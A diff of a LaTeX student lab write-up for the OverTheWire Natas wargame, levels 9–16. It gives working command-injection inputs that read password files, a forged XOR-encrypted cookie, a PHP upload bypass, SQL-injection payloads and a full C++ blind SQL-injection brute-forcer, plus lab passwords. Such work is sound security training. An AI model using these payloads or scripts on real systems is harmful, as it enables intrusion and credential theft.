@@ -25,26 +25,82 @@
 \definecolor{codepurple}{rgb}{0.58,0,0.82}
 \definecolor{backcolor}{rgb}{0.95,0.95,0.95}
 
-\lstset{
-  backgroundcolor=\color{backcolor}, % Set background color
-  commentstyle=\color{codegreen}, % Style for comments
-  keywordstyle=\color{magenta}, % Style for keywords
-  numberstyle=\tiny\color{codegray}, % Style for line numbers
-  stringstyle=\color{codepurple}, % Style for strings
-  basicstyle=\ttfamily\footnotesize, % Basic font style and size
-  breakatwhitespace=false, % Don't break lines at whitespace only
-  breaklines=true, % Enable line breaking
-  captionpos=b, % Caption position (bottom)
-  keepspaces=true, % Keep spaces
-  numbers=left, % Show line numbers on the left
-  numbersep=5pt, % Separation of numbers from code
-  showspaces=false, % Don't show spaces as visible characters
-  showstringspaces=false, % Don't show spaces in strings
-  showtabs=false, % Don't show tabs as visible characters
-  tabsize=2, % Tab size
-  % language=Python % Specify the language
-}
+% \lstset{
+%   backgroundcolor=\color{backcolor}, % Set background color
+%   commentstyle=\color{codegreen}, % Style for comments
+%   keywordstyle=\color{magenta}, % Style for keywords
+%   numberstyle=\tiny\color{codegray}, % Style for line numbers
+%   stringstyle=\color{codepurple}, % Style for strings
+%   basicstyle=\ttfamily\footnotesize, % Basic font style and size
+%   breakatwhitespace=false, % Don't break lines at whitespace only
+%   breaklines=true, % Enable line breaking
+%   captionpos=b, % Caption position (bottom)
+%   keepspaces=true, % Keep spaces
+%   numbers=left, % Show line numbers on the left
+%   numbersep=5pt, % Separation of numbers from code
+%   showspaces=false, % Don't show spaces as visible characters
+%   showstringspaces=false, % Don't show spaces in strings
+%   showtabs=false, % Don't show tabs as visible characters
+%   tabsize=2, % Tab size
+%   xleftmargin=-5em,
+%   framexleftmargin=-5em,
+%   xrightmargin=0pt,
+%   framexrightmargin=0pt,
+%   linewidth=\dimexpr\textwidth+5em\relax,
+% }
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage{etoolbox}
+\usepackage{changepage} % for adjustwidth
 
+% ---------- one knob to control horizontal shift ----------
+\newcommand*\ListingLeftShift{5em}
+
+% Shift and widen every lstlisting (and file listings)
+\BeforeBeginEnvironment{lstlisting}{%
+  \begin{adjustwidth}{-\ListingLeftShift}{0pt}%
+  \lstset{linewidth=\dimexpr\linewidth+\ListingLeftShift\relax}%
+}
+\AfterEndEnvironment{lstlisting}{%
+  \end{adjustwidth}%
+}
+\pretocmd{\lstinputlisting}{%
+  \begin{adjustwidth}{-\ListingLeftShift}{0pt}%
+  \lstset{linewidth=\dimexpr\linewidth+\ListingLeftShift\relax}%
+}{}{}
+\apptocmd{\lstinputlisting}{\end{adjustwidth}}{}{}
+
+% ---------- color definitions ----------
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolor}{rgb}{0.95,0.95,0.95}
+
+% ---------- global listing style ----------
+\lstset{
+  backgroundcolor=\color{backcolor}, % grey background
+  commentstyle=\color{codegreen},
+  keywordstyle=\color{magenta},
+  numberstyle=\tiny\color{codegray},
+  stringstyle=\color{codepurple},
+  basicstyle=\ttfamily\footnotesize,
+  breaklines=true,
+  captionpos=b,
+  keepspaces=true,
+  numbers=left,
+  numbersep=5pt,
+  showspaces=false,
+  showstringspaces=false,
+  showtabs=false,
+  tabsize=2,
+  frame=single,
+  rulecolor=\color{backcolor},
+  framesep=2pt,
+  xleftmargin=0pt,
+  xrightmargin=0pt,
+  framexleftmargin=0pt,
+  framexrightmargin=0pt
+}
 \begin{document}
 \hfill\vbox{\hbox{Jude Shin, Torrey Zachs}
 		\hbox{CSC 321, Section 07}	
@@ -284,28 +340,609 @@ Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
 \end{lstlisting}
 
 \subsection*{Level 9}
-Password: 
+
+I see in the source code below that it puts the value I input, \texttt{key}, directly into the
+\texttt{passthru} statement, which is executing the \texttt{grep} command.
+
+\begin{lstlisting}
+<?php
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+\end{lstlisting}
+
+I can terminate the grep command early with a semicolon, and then execute any command I want,
+followed by \verb|#| to comment out the \texttt{dictionary.txt} string.
+
+So, I input: \verb|; ls #|
+
+This outputs:
+\begin{lstlisting}
+dictionary.txt
+index-source.html
+index.php
+\end{lstlisting}
+
+This isn't very useful.
+
+Instead, I try \verb|ls /| to see the root directory. There is an \texttt{etc} directory. 
+From bandit, normally passwords are stored here. Then, with
+
+\verb|; ls /etc/natas_webpass| \\
+\verb|; cat /etc/natas_webpass/natas10 #|
+
+I retrieve the password.
+
+Password: \texttt{t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu}
 
 \subsection*{Level 10}
-Password: 
+
+\begin{verbatim}
+The only difference between this level and
+the last one is a small blacklist:
+\end{verbatim}
+
+\begin{verbatim}
+if(preg_match('/[;|&]/',$key)) {
+\end{verbatim}
+
+Instead, I now just use this input:
+
+\begin{verbatim}
+'' /etc/natas_webpass/natas11 #
+\end{verbatim}
+
+The '' passes any empty match parameter to grep, so grep will print the entire file.  
+I then insert the file I want to print, and use the same \# to ignore the rest of the line.
+
+Password: \texttt{UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk}
 
 \subsection*{Level 11}
-Password: 
+
+The main code that matters in this level is:
+\begin{lstlisting}
+$data = loadData($defaultdata);
+saveData($data);
+\end{lstlisting}
+
+where loadData encodes a cookie with
+\begin{lstlisting}
+json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+\end{lstlisting}
+
+and saveData sets the cookie with
+\begin{lstlisting}
+setcookie("data", base64_encode(xor_encrypt(json_encode($data))));
+\end{lstlisting}
+
+looking at the xor\_encrypt function, the two thing we need for the encryption are
+the passed in value (the Cookie), and the key, which is censored, and we dont have It.
+
+\begin{lstlisting}
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+        $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+\end{lstlisting}
+
+This encryption performs input\^key = Cookie.  
+However, since the xor operation is symmetric, we can also do:  
+Cookie\^input = key
+
+Here, the input is the raw data from the Cookie struct, which looks like this:
+
+\begin{lstlisting}
+$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
+\end{lstlisting}
+
+\begin{verbatim}
+We can see what the current $_COOKIE of the site is by 
+typing into the browser console:
+document.cookie, which gives, among other things:
+\end{verbatim}
+
+\begin{lstlisting}
+data = HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GcmBZUnJgTRg%3D
+\end{lstlisting}
+
+So, we can use their same encryption algorithm, 
+\begin{verbatim}
+where Cookie = HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GcmBZUnJgTRg  
+\end{verbatim}
+and our input is their default data.  
+I use the below script to generate their key using the same xor\_encrypt function.
+
+\begin{lstlisting}
+<?php
+$key = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
+$text = base64_decode("HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GcmBZUnJgTRg=");
+$outText = '';
+
+// Iterate through each character
+for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+}
+echo $outText;
+?>
+\end{lstlisting}
+
+This outputs eDWoeDWoeDWoeDWoeS:  
+So, the key is the repeating part, eDWo, since we iterate over the length of the input (our cookie),  
+which is longer than the key here.
+
+Now that we have the key, we can generate our own cookie that will set showpassword to "yes".  
+I use the below script to generate the correct cookie, using their same xor\_encrypt function:
+
+\begin{lstlisting}
+<?php
+function xor_encrypt($in) {
+    $key = 'eDWo';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+        $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#676767");
+echo "\n";
+echo base64_encode(xor_encrypt(json_encode($defaultdata)));
+?>
+\end{lstlisting}
+
+This generates:  \\
+HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZ2FYU3NhWEc5  
+
+I then set this as the cookie in my browser by using  \\
+\texttt{document.cookie="data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZ2FYU3NhWEc5"}  
+
+Then, when I reload the page, it will use the cookie I just set, and it decodes that cookie to get the data array with showpassword set to "yes",  
+which executes the line to show me the password for the next level.  
+
+Password: \texttt{yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB}
 
 \subsection*{Level 12}
-Password: 
+
+I observe in the code for this level that it requires that the file I upload is a .jpg on the browser side,  
+so I uploaded this file as a jpg in their webpage:
+
+\begin{lstlisting}
+<?php
+$filename = '/etc/natas_webpass/natas13';
+
+if (file_exists($filename)) {
+    // Read the file and output its contents
+    echo nl2br(htmlspecialchars(file_get_contents($filename)));
+} else {
+    echo "File not found.";
+}
+?>
+\end{lstlisting}
+
+This is a php file that will echo the contents of the password file for natas13 (using getfilecontents).  
+To make this file interpreted as php by the server, I modify the message being sent to the server to be:  
+using burpsuite, replacing the name of the file printPW.jpg → printPw.php.  
+After I send the message in burp suite, the web page displays the password.  
+
+Password: \texttt{trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC}
 
 \subsection*{Level 13}
-Password: 
+
+They say for security reasons, they now only accept image files.  
+Level 12→13 method gets rejected now.  
+I’m guessing this just means they are checking the header of the file.  
+
+This time, I upload an actual jpg file.  
+The jpg file is only a 1x1 white pixel. On burp suite, this is what is queued to be sent:
+
+\begin{lstlisting}
+4r1zgqson0.jpg
+------WebKitFormBoundaryH5RSG5Atp6sbji9B
+Content-Disposition: form-data; name="uploadedfile"; filename="smallest.jpg"
+Content-Type: 
+<complete Junk>
+------WebKitFormBoundaryH5RSG5Atp6sbji9B--
+\end{lstlisting}
+
+I replace all jpg with php now, but leave what I would guess to be the file header (the first few bytes) unchanged.  
+I then place the same php code as before in the body of the file.  
+The text I forward is:
+
+\begin{lstlisting}
+------WebKitFormBoundaryU8x8Gvgi4a8priMU
+Content-Disposition: form-data; name="filename"
+
+4r1zgqson0.php
+------WebKitFormBoundaryU8x8Gvgi4a8priMU
+Content-Disposition: form-data; name="uploadedfile"; filename="smallest.php"
+Content-Type: application/x-php
+<complete Junk>
+<?php
+$filename = '/etc/natas_webpass/natas14';
+
+if (file_exists($filename)) {
+    // Read the file and output its contents
+    echo nl2br(htmlspecialchars(file_get_contents($filename)));
+} else {
+    echo "File not found.";
+}
+?>
+<complete Junk>
+------WebKitFormBoundaryU8x8Gvgi4a8priMU--
+\end{lstlisting}
+
+The output text won’t format nicely here, but the password is there:  \\
+Password: \texttt{z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ}
 
 \subsection*{Level 14}
-Password: 
+
+This uses an SQL query and selects all users with matching username and password.  
+In the code, they select with:
+
+\begin{lstlisting}
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+\end{lstlisting}
+
+I put as my username:  
+\texttt{" or true; --}  
+
+this makes the query look like:
+
+\begin{lstlisting}
+$query = "SELECT * from users where username=\"\" or true; -- ... <comments ignored>;
+\end{lstlisting}
+
+So, it selects all users in the database. Since this selects more than 0 rows, it passes the if statement and prints the password.  
+
+Password: \texttt{SdqIqBsFcz3yotlNYErZSZwblkm0lrvx}
 
 \subsection*{Level 15}
-Password: 
+
+This problem has the problematic lines:
+
+\begin{lstlisting}
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+$res = mysql_query($query, $link);
+if($res) {
+    if(mysql_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    } else {
+        echo "This user doesn't exist.<br>";
+    }
+} else {
+    echo "Error in query.<br>";
+}
+\end{lstlisting}
+They directly insert our query string into query. 
+For this problem, if we give a string of the form: 
+\begin{lstlisting}
+username=natas16 " AND BINARY substring(password,1,1) = 'a' --
+\end{lstlisting}
+then the query becomes:
+\begin{lstlisting}
+SELECT * from users where username=natas16 " AND BINARY substring(password,1,1) = 'a' -- "
+\end{lstlisting}
+
+The -- comments out the last quote, so the query is valid.  
+We check easily that a user natas16 exists, by just sending natas16, and assume that the password for user natas16 will correspond to the password for the next level.  
+We are injecting the additional condition that the first character of the password is 'a'.  
+If the response is "This user exists", then we know that the first character is 'a'.  
+If the response is "This user doesn't exist", then we know that the first character is not 'a'.  
+We can repeat this process over every possible character for every slot of the password until we have the full password.
+
+I wrote a C++ program that will do this automatically. The large strings from the HTTP requests were taken by looking at what a normal request looks like by using their GUI and viewing the staged message in burp suite.
+
+\begin{lstlisting}
+#include <iostream>
+#include <string>
+#include <cstring>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+
+
+const std::string top_header = 
+    "POST /index.php HTTP/1.1\r\n"
+    "Host: natas15.natas.labs.overthewire.org\r\n"
+    "Content-Length: ";
+
+//need to insert content length between top_header and request_main
+
+const std::string bottom_header ="\r\n"
+    "Cache-Control: max-age=0\r\n"
+    "Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA"
+    "==\r\nAccept-Language: en-US,en;q=0.9\r\n"
+    "Origin: http://natas15.natas.labs.overthewire.org\r\n"
+    "Content-Type: application/x-www-form-urlencoded\r\n"
+    "Upgrade-Insecure-Requests: 1\r\n"
+    "User-Agent: Mozilla/5.0 (X11; Linux x86_64) "
+    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\r\n"
+    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,"
+    "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
+    "Referer: http://natas15.natas.labs.overthewire.org/\r\n"
+    "Accept-Encoding: identity\r\n"
+    "Connection: keep-alive\r\n"    
+    "\r\n";                      
+
+    
+const std::string request_value_base =
+    "username=natas16"
+    "\" AND BINARY substring(password,1,";
+    //raw string for gui testing:
+    //username=natas16 " AND BINARY substring(password,1,1) = 'a' -- 
+
+    const std::string host = "natas15.natas.labs.overthewire.org";
+    constexpr int port = 80; 
+
+typedef enum matchResult {
+    NO_MATCH,
+    MATCH,
+    Connection_Error
+} matchResult;
+
+int createConnection();
+void findPassword(int sock);
+matchResult checkPW_Match(int sock, std::string& request_value);
+
+int main() {
+    FILE *fp = freopen("password_res.txt", "w", stdout);
+    if (fp == NULL) {
+        perror("freopen failed");
+        return 1;
+    }
+
+    //Connect
+    int sock;
+    if ( (sock = createConnection()) < 0) {
+        std::cout << "Failed to create connection. Exiting.\n";
+        exit(1);
+    }
+    findPassword(sock);
+
+}
+
+int createConnection() {
+    hostent* server = gethostbyname(host.c_str());
+    if (!server) {
+        std::cerr << "Host not found.\n";
+        return -1;
+    }
+
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        perror("socket");
+        return -1;
+    }
+    sockaddr_in serv_addr{};
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(port);
+    std::memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);
+
+    struct timeval tv;
+    tv.tv_sec  = 2;  // 2.5 s timeout
+    tv.tv_usec = 500000; 
+
+    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
+        perror("setsockopt(SO_RCVTIMEO)");
+    }
+    if (connect(sock, (sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
+        perror("connect");
+        close(sock);
+        return -1;
+    }
+    return sock;
+}
+
+//Construct password one character at a time
+void findPassword(int sock) {
+    std::string password= "";  
+    while(password.length() < 64) { //password shouldn't be too long
+        constexpr char endChar = 'z';
+        for (char nextChar = '0'; nextChar <= endChar; nextChar++){
+            if(!std::isalnum(nextChar)){
+                continue;
+            }
+
+            std::string request_value = request_value_base + std::to_string(password.length() + 1) + ")"
+                " = '" + password + nextChar + "' #";
+            matchResult res = checkPW_Match(sock, request_value);
+
+            if(res == MATCH){
+                password += nextChar;
+                std::cout << "Found so far: " << password << "\n";
+                break;  //continue to next string position
+
+            } else if (res == Connection_Error){
+                std::cout << "Connection error occurred. Will attempt to reconnect.\n";
+                close(sock);
+                if ( (sock = createConnection()) < 0) {
+                    std::cout << "Failed to create connection. Exiting.\n";
+                    exit(1);
+                }
+                nextChar--; //try again with new connection
+                continue;   
+
+            } else if (res == NO_MATCH && nextChar == endChar){
+                std::cout << "No more matching characters found. Password is: " << password << "\n";
+                close(sock);
+                exit(0);
+            }
+        }
+
+    }
+    std::cout<<"pw too long, something is wrong..\n";
+    exit(1);
+}
+
+//send the request to natas15 and check response for match or no match.
+matchResult checkPW_Match(int sock, std::string& request_value) {
+
+    //Send request
+    std::string full_request = top_header + std::to_string(request_value.length()) + bottom_header + request_value;
+    ssize_t sent = send(sock, full_request.c_str(), full_request.length(), 0);
+    if (sent < 0) {
+        std::cout<<"send error\n";
+        close(sock);
+        return Connection_Error;
+    }
+
+    // Recv response
+    char buffer[4096];
+    std::string response={0};
+    ssize_t bytes;
+    while ((bytes = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
+        buffer[bytes] = '\0';
+        response += buffer;
+        if(response.find("This user exists") != std::string::npos) {
+            std::cout << request_value << "exists!\n";
+
+            return matchResult::MATCH;
+        } else if (response.find("This user doesn't exist") != std::string::npos) {
+            return matchResult::NO_MATCH;
+        }
+    }
+
+    //We didn't find the match or no match text
+    std::cout << "message timeout or invalid\n";
+    std::cout<< "Full request was:\n" << full_request << "\n";
+    std::cout << "Full response:\n" << response << "\n";
+    return Connection_Error;
+}
+
+\end{lstlisting}
+
+The above cpp program used the corresponding Makefile:
+
+\begin{lstlisting}
+CXX      := g++
+CXXFLAGS := -std=c++17 -Wall -O2
+
+TARGET := client
+SRC    := main.cpp
+
+all: $(TARGET)
+
+$(TARGET): $(SRC)
+	$(CXX) $(CXXFLAGS) $(CURL_CFLAGS) -o $@ $^ $(CURL_LIBS)
+
+run: $(TARGET)
+	./$(TARGET)
+
+clean:
+	rm -f $(TARGET)
+\end{lstlisting}
+
+The last line of my C program output was:  
+No more matching characters found. Password is: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo  
+
+Password: \texttt{hPkjKYviLQctEW33QmuXL6eDVfMW4sGo}
 
 \subsection*{Level 16}
-Password: 
 
+This problem has the problematic line:
+
+\begin{lstlisting}
+if(preg_match('/[;|&`\'"]/',$key)) {
+    print "Input contains an illegal character!";
+} else {
+    passthru("grep -i \"$key\" dictionary.txt");
+}
+\end{lstlisting}
+
+In this problem, they attempt to filter 
+out characters that would allow command injection.  
+However, blacklisting is not a secure way to filter input,
+and we can still command inject by submitting a string of the form:  
+\begin{lstlisting}
+$(grep ^<pw> /etc/natas_webpass/natas17)cringe
+\end{lstlisting}
+where pw is our guess at the password.
+
+\begin{verbatim}
+The key issue is that we can inject subcommands using $(),
+which is not blacklisted. Our command inside $() greps
+the natas17 file for a line starting with pw.
+The ^ forces the line to start with our password,
+so we aren't just matching any substring.
+If our guess matches the start of the password,
+the subcommand will output the password,
+\end{verbatim}
+
+\begin{verbatim}
+However, we don't have a way of viewing the password directly,
+ instead, we append "cringe" to the end of the subcommand output,
+  and look up the word in the dictionary.
+If our guess is correct, the full output will be "<password>cringe",
+ which doesn't exist in the dictionary.txt file,
+  so we will get a response with no words.
+If our guess is incorrect, the output will be "cringe",
+ which does exist in the dictionary.txt file,
+  so we will get a response with the word "cringe".
+I use almost the exact same Cpp program as level 15,
+ except with modification to the String being sent,
+  and how the response is interpreted.
+For brevity, below I only provide the logic for sending the request,
+ and interpreting the response.
+\end{verbatim}
+
+\begin{lstlisting}
+//message top should appear like:
+//GET /?needle=%24%28grep+%5Epw+%2Fetc%2Fnatas_webpass%2Fnatas17%29cringe
+// where pw is the password we are guessing. The ^ makes it so that it only matches at the start of the line
+const std::string messageBottom =
+    "&submit=Search HTTP/1.1\r\n"
+    "Host: natas16.natas.labs.overthewire.org\r\n"
+    "Authorization: Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw==\r\n"
+    "Accept-Language: en-US,en;q=0.9\r\n"
+    "Upgrade-Insecure-Requests: 1\r\n"
+    "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\r\n"
+    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
+    "Referer: http://natas16.natas.labs.overthewire.org/\r\n"
+    "Accept-Encoding: identity\r\n"
+    "Connection: keep-alive\r\n\r\n" ;
+
+    //inside main, part for formatting request:
+    std::string request_value = "GET /?needle=%24%28grep+%5E"
+            + password + nextChar + "+%2Fetc%2Fnatas_webpass%2Fnatas17%29cringe";
+    matchResult res = checkPW_Match(sock, request_value);
+
+    //inside checkPW_Match, part for interpreting response:
+    while ((bytes = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
+        buffer[bytes] = '\0';
+        response += buffer;
+        if(response.find("cringe") != std::string::npos) {
+            std::cout << request_value << " does not exist.\n";
+            return matchResult::NO_MATCH;   // our password was not concatenated with cringe, it did not match
+        } else if (response.find("</pre>") != std::string::npos) {  // end of output block
+            std::cout << request_value << " exists!\n";
+            return matchResult::MATCH;  // our password was concatenated with cringe, so it matched
+        }
+    }
+\end{lstlisting}
+
+The last line of my Cpp program output was:  
+\begin{lstlisting}
+No more matching characters found. Password is: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC  
+\end{lstlisting}
+
+Password: \texttt{EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC}
 
 \end{document}
